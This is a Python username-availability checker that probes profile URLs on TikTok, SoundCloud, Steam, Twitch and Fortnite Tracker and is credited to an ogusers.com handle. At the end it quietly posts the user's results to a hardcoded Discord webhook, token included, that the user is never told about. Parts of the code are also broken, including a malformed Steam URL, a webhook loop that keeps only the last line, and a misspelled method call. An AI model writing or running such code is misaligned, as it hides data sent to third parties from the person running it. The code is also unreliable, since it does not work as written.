import random, string, requests, time
from colorama import Fore
import concurrent.futures
import os
Title = "MULTI-PLATFORM CHECKER"
print(Title)
print("v1 | ogusers.com/n4z1")
time.sleep(.5)
K4 = int(input(Fore.RED+"""
        [1] TikTok
        [2] SoundCloud
        [3] Steam
        [4] Twitch
        
        [5] Fortnite
        Choose one : """+Fore.WHITE))
webss = ''
webs = ''
if K4 == 1 :
    webss = 'tiktok.com/@'
    webs = "TikTok"
elif K4 == 2 :
    webss = 'soundcloud.com/'
    webs = "SoundCloud"
elif K4 == 3 :
    webss = 'https://steamcommunity.com/id/'
    webs = "Steam"
elif K4 == 4 :
    webss = 'm.twitch.tv/'
    webs = "Twitch"
elif K4 == 5 :
    webss = 'fortnitetracker.com/profile/search?q='
    webs = "Fortnite"
else:
    print('Error, please choose correct number.. ')
    time.sleep(3)
    quit()

def check(users): 
    try:
        r = requests.get(f'https://{webss}{users}')
        if r.status_code == 200:
            print(Fore.WHITE+"[+] "+Fore.WHITE + "Taken"+ Fore.WHITE+ f' {users}')
        else:
            print(Fore.WHITE + "[+] " + Fore.GREEN + "Available" + Fore.WHITE + f' {users}')
            f = open("Hits.txt", "a", encoding='utf-8')
            f.write(f"{users} | Available or Banned On => {webs} |\n")
    except:
        pass

with open('users.txt', 'r') as f:
    users = [line.strip() for line in f]
with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(check,users)
from discord_webhook import DiscordWebhook

file = open("Hits.txt", 'r')
lines = file.readlines()

for line in lines:
    webhook= DiscordWebhook(url='https://discord.com/api/webhooks/955032244706234438/Cs84n-Kk5PfaVaM9YgWJ09ar6taK8FSz_d2zfXLiQz-N0CrYB3wk3c5D6n7-I6Z15nts', content= line)

response = webhook.exectute()
file.close()